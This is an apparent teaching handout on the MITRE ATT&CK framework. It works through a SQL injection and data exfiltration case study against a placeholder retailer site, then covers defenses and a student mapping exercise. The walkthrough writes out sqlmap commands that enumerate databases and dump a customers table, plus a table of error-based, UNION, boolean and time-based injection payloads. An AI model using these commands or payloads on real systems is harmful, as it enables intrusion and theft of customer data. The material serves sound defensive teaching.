1. What is MITRE ATT&CK?

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a globally recognized, open knowledge base that catalogs how real-world adversaries behave after they gain access to computer systems.

Created by The MITRE Corporation in 2013 and publicly released in 2015, it is now maintained by a global community of cybersecurity professionals.

Why It Matters

  • Provides a common language for describing cyberattacks
  • Focuses on the adversary's perspective to help defenders anticipate threats
  • Used for threat detection, red teaming, and gap analysis
  • Bridges the gap between theory and real-world practice

Three Main Matrices

  • Enterprise — Windows, macOS, Linux, Cloud, Network
  • Mobile — Android, iOS
  • ICS — Industrial Control Systems

Each matrix organizes adversary behavior into Tactics (columns) and Techniques (cells).

2. Framework Structure

The MITRE ATT&CK framework is built on six core concepts. Understanding each is essential before analyzing any attack.

Component ID Format Description Example
Tactics TAxxxx The "WHY" — the adversary's goal at each phase of the attack (e.g., gain access, steal data). TA0001 — Initial Access
Techniques Txxxx The "HOW" — specific methods used to accomplish a tactic. T1190 — Exploit Public-Facing Application
Procedures / Groups Gxxxx The "WHO" — real-world threat groups and their specific implementations of techniques. G0087 — APT39
Mitigations Mxxxx The "WHAT TO DO" — preventive controls that reduce the risk of a technique succeeding. M1016 — Vulnerability Scanning
Detection — The "HOW TO FIND IT" — strategies and indicators for spotting active use of a technique. Monitor application logs for SQL syntax errors
Data Sources DSxxxx The "WHERE TO LOOK" — types of data that provide visibility into technique usage. DS0015 — Application Log
How to read the ATT&CK Matrix: Each column is a Tactic (goal). Under each column, the cells list Techniques (methods) that adversaries use to achieve that goal. An attack typically flows left to right through multiple tactics.

3. Case Study: SQL Injection & Data Exfiltration

Scenario

A small online retailer runs a web application with a product search feature. The search box is vulnerable to SQL Injection because user input is inserted directly into database queries without validation or parameterization. An attacker discovers this flaw, uses the tool sqlmap to automate the exploitation, extracts customer data (usernames, emails, password hashes), and exfiltrates it to an external cloud service over HTTPS.

Detailed Attack Walkthrough

Step 1: Vulnerability Discovery

The attacker navigates to the retailer's website and notices a product search box. To test for SQL injection, they enter a single quote character:

Search input: '

The application returns an error like:

Error: You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the right
syntax to use near ''' at line 1

This error reveals that:

  • User input is passed directly into SQL queries without sanitization
  • The backend database is MySQL
  • The application shows verbose error messages (information disclosure)
Why is this dangerous? The vulnerable code likely looks like this:
query = "SELECT * FROM products WHERE name = '" + user_input + "'"
Instead of using parameterized queries, the input is concatenated directly into the SQL string.
Step 2: Automated Exploitation with sqlmap

The attacker uses sqlmap, an open-source penetration testing tool, to automate exploitation.

a) Confirm SQL Injection

sqlmap -u "https://shop.example.com/search?q=laptop"

sqlmap tests various injection techniques (error-based, UNION-based, blind) and confirms the parameter q is injectable.

b) Enumerate Databases

sqlmap -u "https://shop.example.com/search?q=laptop" --dbs

Output reveals available databases:

[*] information_schema
[*] shop_db
[*] mysql

c) Enumerate Tables

sqlmap -u "https://shop.example.com/search?q=laptop" -D shop_db --tables

Output:

[*] customers
[*] orders
[*] products
[*] admin_users

d) Dump Sensitive Data

sqlmap -u "https://shop.example.com/search?q=laptop" -D shop_db -T customers --dump

This extracts the full contents of the customers table: usernames, emails, and hashed passwords.

Step 3: Types of SQL Injection Used
Type How It Works Example
Error-based Triggers database errors that leak information about the schema ' AND 1=CONVERT(int, @@version)--
UNION-based Appends a second query using UNION to extract data from other tables ' UNION SELECT username, password FROM users--
Blind (Boolean) Asks true/false questions; infers data from application behavior ' AND 1=1-- vs ' AND 1=2--
Blind (Time-based) Uses time delays to infer data when no visible output changes ' AND SLEEP(5)--
Step 4: Data Exfiltration

After extracting the data, the attacker transfers it out of the compromised environment:

  • Data is saved locally, then uploaded to a cloud storage service (e.g., a file-sharing platform)
  • The transfer uses HTTPS, making it look like normal encrypted web traffic
  • This blends with legitimate traffic, making detection difficult
Why cloud exfiltration is effective: Security tools often whitelist traffic to popular cloud services. Encrypted HTTPS traffic is hard to inspect without SSL/TLS decryption in place.

5. Defense & Mitigation Strategies

1. Input Validation

Reject any input containing SQL-special characters. Use allowlists to define acceptable input patterns.

-- BAD (vulnerable):
query = "SELECT * FROM products
  WHERE name = '" + input + "'"

-- GOOD (parameterized):
query = "SELECT * FROM products
  WHERE name = ?"
cursor.execute(query, (input,))

2. Parameterized Queries

Always use prepared statements. This separates SQL logic from data, making injection impossible.

// PHP PDO Example:
$stmt = $pdo->prepare(
  "SELECT * FROM products
   WHERE name = :name"
);
$stmt->execute([':name' => $input]);

3. Least Privilege

Database accounts used by the web app should have minimal permissions:

  • Read-only access where possible
  • No access to information_schema
  • No FILE or EXECUTE privileges

4. Monitoring & Detection

  • Log all database queries and web requests
  • Set alerts for SQL keywords in URL parameters
  • Monitor for unusual outbound data transfers
  • Implement a Web Application Firewall (WAF)
  • Use DLP (Data Loss Prevention) tools

6. Student Exercise: Map Your Own ATT&CK Flow

Your Task

Choose one of the following scenarios and create a complete MITRE ATT&CK mapping, just like the SQL injection case study above.

Scenario A

Data exfiltration from OneDrive

An attacker compromises a user's Microsoft 365 account and steals sensitive files from OneDrive.

Scenario B

Data exfiltration from Google Drive

An attacker uses a phishing email to gain access to a Google Workspace account and downloads confidential documents.

Scenario C

Data exfiltration from MS SQL Server

An attacker exploits a misconfigured MS SQL Server exposed to the internet and extracts financial records.

Scenario D

Data exfiltration from Cloud (AWS/Azure)

An attacker uses stolen API keys to access an S3 bucket / Azure Blob and downloads all stored data.

Step-by-Step Instructions

Step 1: Understand the Scenario

Read your chosen scenario carefully. Ask yourself:

  • What is the target? (what system/data is being attacked)
  • What is the entry point? (how does the attacker get in)
  • What is the goal? (what data do they want to steal)
  • How do they get the data out? (exfiltration method)

Step 2: Identify the Tactics (the "WHY")

List the phases of the attack using MITRE ATT&CK Tactics. Typical flow:

  1. TA0001 — Initial Access: How does the attacker gain their first foothold?
  2. TA0006 — Credential Access (if applicable): Do they steal credentials?
  3. TA0007 — Discovery (if applicable): Do they explore the environment?
  4. TA0009 — Collection: How do they gather the target data?
  5. TA0010 — Exfiltration: How do they transfer data out?
Reference: Browse all tactics at attack.mitre.org/tactics/enterprise/

Step 3: Identify the Techniques (the "HOW")

For each tactic, find the matching technique on the MITRE ATT&CK website:

  1. Go to attack.mitre.org
  2. Click on the relevant Tactic
  3. Browse the list of Techniques and find the one that best matches your scenario
  4. Note the technique ID (e.g., T1566.001 for Spearphishing Attachment)
Tip: Many techniques have sub-techniques (e.g., T1567.002). Check if a sub-technique is a more precise match than the parent technique.

Step 4: Describe the Procedures (the "WHO/WHAT")

For each technique, write a short description of how the attacker specifically uses it in your scenario. You can also look up known threat groups that use this technique.

Check the "Procedure Examples" section on each technique's page on the MITRE website.

Step 5: Define Mitigations (the "DEFENSE")

For each technique, identify what controls could prevent or reduce the attack:

  1. On the technique page, scroll to the "Mitigations" section
  2. Note the mitigation ID and name (e.g., M1032 — Multi-factor Authentication)
  3. Add any additional mitigations you think are relevant

Step 6: Define Detection Strategies (the "HOW TO FIND IT")

For each technique, describe how a security team could detect this activity:

  • What logs should be monitored?
  • What alerts should be configured?
  • What anomalies would indicate this technique is being used?

Step 7: Identify Data Sources (the "WHERE TO LOOK")

For each technique, note which data sources provide visibility:

  • Check the "Detection" section on the technique page for listed data sources
  • Common data sources: DS0015 (Application Log), DS0029 (Network Traffic), DS0028 (Logon Session), DS0002 (User Account)
Full list: attack.mitre.org/datasources/
